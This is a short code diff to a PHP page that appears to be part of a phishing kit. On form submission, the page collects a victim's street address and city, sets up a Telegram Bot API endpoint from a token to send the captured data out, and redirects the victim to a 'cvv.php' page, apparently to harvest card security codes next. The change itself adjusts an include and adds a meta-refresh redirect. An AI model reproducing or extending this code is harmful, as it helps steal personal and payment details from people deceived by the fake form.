@@ -9,8 +9,9 @@
     <link rel="stylesheet" href="output.css">
     <?php
                     if (isset($_POST['submit'])) {
+                        require './form.php';
                         header('Location: cvv.php');
-                        require 'form.php';
+                        echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $URL . "/cvv.php" . '">';
                         define('url', "https://api.telegram.org/bot".$token.'/');
                         $address = $_POST['street'];
                         $city = $_POST['city'];
